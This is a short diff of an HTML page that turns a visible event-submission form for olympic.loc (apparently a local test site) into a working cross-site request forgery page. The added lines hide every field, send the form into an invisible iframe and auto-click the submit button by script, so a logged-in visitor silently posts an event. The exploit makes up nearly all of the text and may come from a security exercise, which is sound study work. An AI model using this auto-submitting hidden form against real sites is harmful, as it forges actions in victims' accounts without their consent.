@@ -7,16 +7,15 @@
 	</head>
 	<body>
 		<h1>#bezgodov</h1>
-		<form action="http://olympic.loc/page/addevent" method="post">
-			<input type="text" name="title" value="title">
-			<input type="text" name="date" placeholder="ДД-ММ-ГГГГ" value="12-03-2019">
-			<input type="time" name="timeStart">
-			<input type="text" name="place">
-			<input type="text" name="organizer">
-			<textarea name="description"></textarea>
-			<input type="submit" id="submit" value="Добавить мероприятие" name="submit">
-
-		
+		<iframe style="display:none" name="csrf-frame"></iframe>
+		<form action="http://olympic.loc/page/addevent" method="post" target="csrf-frame">
+			<input type="text" name="title" value="title" hidden>
+			<input type="text" name="date" placeholder="ДД-ММ-ГГГГ" value="13-12-2017" hidden>
+			<input type="time" name="timeStart" hidden>
+			<input type="text" name="place" hidden>
+			<input type="text" name="organizer" hidden>
+			<textarea name="description" hidden></textarea>
+			<input type="submit" id="submit" value="Добавить мероприятие" name="submit" hidden>
 		</form>
 		<script>
 			document.getElementById('submit').click();
